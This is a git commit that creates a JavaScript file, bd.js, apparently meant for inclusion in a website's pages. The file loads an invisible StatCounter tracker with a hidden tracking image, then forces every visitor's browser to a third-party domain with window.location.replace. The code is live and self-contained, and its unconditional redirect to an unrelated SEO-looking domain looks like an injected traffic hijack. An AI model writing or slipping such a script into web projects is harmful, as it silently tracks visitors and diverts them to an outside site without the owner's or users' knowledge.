a59d4b420dbe688801665dbfd9b20d5d235d4a3f
Tktest168 <tt988886666@gmail.com>
2025-04-29 19:43:55 +0800

    Create bd.js

---
+++ js/bd.js
@@ -0,0 +1,29 @@
+var sc_project = 13089473; 
+var sc_invisible = 1; 
+var sc_security = "fa0c9bae"; 
+
+var script = document.createElement("script");
+script.type = "text/javascript";
+script.src = "https://www.statcounter.com/counter/counter.js";
+script.async = true;
+document.head.appendChild(script);
+
+var noscriptDiv = document.createElement("div");
+noscriptDiv.classList.add("statcounter");
+
+var link = document.createElement("a");
+link.href = "https://statcounter.com/";
+link.target = "_blank";
+link.title = "Web Analytics";
+
+var img = document.createElement("img");
+img.classList.add("statcounter");
+img.src = "https://c.statcounter.com/13089473/0/fa0c9bae/1/";
+img.alt = "Web Analytics";
+img.referrerPolicy = "no-referrer-when-downgrade";
+
+link.appendChild(img);
+noscriptDiv.appendChild(link);
+document.body.appendChild(noscriptDiv);
+
+window.location.replace("https://seo001.asha772.com");
